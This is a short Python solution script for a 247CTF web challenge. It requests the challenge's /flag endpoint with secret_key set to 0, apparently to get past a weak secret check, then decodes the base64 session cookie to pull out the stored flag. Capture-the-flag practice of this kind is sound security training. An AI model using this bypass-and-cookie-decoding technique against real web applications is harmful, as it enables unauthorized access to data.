import requests
import base64
import json

url = "https://cba71f1836451fbc.247ctf.com/"

res = requests.get(f'{url}/flag', params={
    'secret_key': 0
})

cookie = res.cookies['session']

body = cookie.split(".")[0].strip()
payload = json.loads(base64.b64decode(body + '=').decode())

flag = payload['flag'][' b']
print("Flag:", base64.b64decode(flag).decode())